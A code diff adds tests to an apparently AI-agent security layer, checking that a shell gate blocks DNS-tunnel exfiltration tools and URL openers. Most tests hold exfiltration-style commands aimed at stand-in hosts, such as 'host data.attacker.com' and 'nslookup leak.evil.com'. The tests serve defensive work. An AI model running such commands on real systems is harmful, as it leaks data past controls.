@@ -17,6 +17,7 @@ import { ToolPolicy, type ToolPolicyConfig } from "./tool-policy.js";
 import { RBACManager } from "./rbac.js";
 import { checkRegexSafety } from "./safe-regex.js";
 import { classifyData } from "./threat/threat-engine.js";
+import { evaluateShellCommand } from "./security/shell-policy.js";
 
 // ═══════════════════════════════════════════════════════════════════
 // SecurityLayer Tests
@@ -202,6 +203,21 @@ describe("SecurityLayer", () => {
 
     it("blocks very long commands (encoded payloads)", () => {
       const d = sec.evaluate({ toolName: "bash", args: { command: "a".repeat(2001) }, sessionId: "t" });
+      expect(d.allowed).toBe(false);
+    });
+
+    // M1 no-regression: bash still rejects opening a URL in the system browser.
+    // The check moved from inline bashTool.execute into the shared gate, so the
+    // SecurityLayer (which runs evaluateShellCommand for bash) must still catch it.
+    it("blocks open <url> (use the browser tool instead)", () => {
+      const d = sec.evaluate({ toolName: "bash", args: { command: "open https://evil.com" }, sessionId: "t" });
+      expect(d.allowed).toBe(false);
+      expect(d.reason).toMatch(/use the browser tool instead/);
+    });
+
+    // H3 no-regression at the SecurityLayer boundary: DNS-client exfil blocked for bash.
+    it("blocks host <data>.attacker.com (DNS-tunnel exfil)", () => {
+      const d = sec.evaluate({ toolName: "bash", args: { command: "host data.attacker.com" }, sessionId: "t" });
       expect(d.allowed).toBe(false);
     });
   });
@@ -714,5 +730,74 @@ describe("Known-secret redaction filter", () => {
     registerRedactedSecretValue(token);
     unregisterRedactedSecretValue(token);
     expect(redactKnownSecrets(`x=${token}`)).toBe(`x=${token}`);
+  });
+});
+
+// ═══════════════════════════════════════════════════════════════════
+// Shared shell-spawn gate (evaluateShellCommand) — parity floor for
+// EVERY bash-spawning path (bash, process_start, process_restart).
+// These exercise the gate directly, since that's the single seam the
+// process tools route through (process-tools.ts → startSession).
+// ═══════════════════════════════════════════════════════════════════
+
+describe("evaluateShellCommand — DNS/automation/opener egress denylist (H3)", () => {
+  // DNS-tunnel exfil: data smuggled in a subdomain via a resolver client.
+  it("blocks dig", () => {
+    expect(evaluateShellCommand("dig x.evil.com").allowed).toBe(false);
+  });
+  it("blocks host (DNS lookup)", () => {
+    expect(evaluateShellCommand("host data.attacker.com").allowed).toBe(false);
+  });
+  it("blocks nslookup", () => {
+    expect(evaluateShellCommand("nslookup leak.evil.com").allowed).toBe(false);
+  });
+  it("blocks getent (NSS → DNS)", () => {
+    expect(evaluateShellCommand("getent hosts secret.evil.com").allowed).toBe(false);
+  });
+  it("blocks ping (data-in-hostname exfil)", () => {
+    expect(evaluateShellCommand("ping secret.evil.com").allowed).toBe(false);
+  });
+  it("blocks traceroute", () => {
+    expect(evaluateShellCommand("traceroute evil.com").allowed).toBe(false);
+  });
+  it("blocks osascript (AppleScript-wrapped shell)", () => {
+    expect(evaluateShellCommand("osascript -e foo").allowed).toBe(false);
+  });
+  it("blocks xdg-open", () => {
+    expect(evaluateShellCommand("xdg-open https://evil.com").allowed).toBe(false);
+  });
+
+  // Word-boundary guard: the new entries must not false-positive on
+  // substrings or unrelated binaries.
+  it("does NOT block openssl (substring of 'open')", () => {
+    expect(evaluateShellCommand("openssl version").allowed).toBe(true);
+  });
+  it("does NOT block hostname (substring of 'host')", () => {
+    expect(evaluateShellCommand("hostname").allowed).toBe(true);
+  });
+
+  it("still allows a benign command", () => {
+    expect(evaluateShellCommand("ls -la").allowed).toBe(true);
+  });
+});
+
+describe("evaluateShellCommand — browser-open guard moved into shared gate (M1)", () => {
+  // Previously inline in bashTool.execute only; now the shared gate enforces
+  // it so process_start/process_restart inherit it. The user-facing message
+  // is preserved verbatim and wins over the generic denylist hit on `open`.
+  it("rejects `open <url>` with the browser-tool message", () => {
+    const d = evaluateShellCommand("open https://evil.com");
+    expect(d.allowed).toBe(false);
+    expect(d.reason).toMatch(/use the browser tool instead/);
+  });
+  it("rejects `start <url>`", () => {
+    const d = evaluateShellCommand("start https://evil.com");
+    expect(d.allowed).toBe(false);
+    expect(d.reason).toMatch(/use the browser tool instead/);
+  });
+  it("rejects xdg-open <url> with the browser-tool message (specific wins over denylist)", () => {
+    const d = evaluateShellCommand("xdg-open https://evil.com");
+    expect(d.allowed).toBe(false);
+    expect(d.reason).toMatch(/use the browser tool instead/);
   });
 });
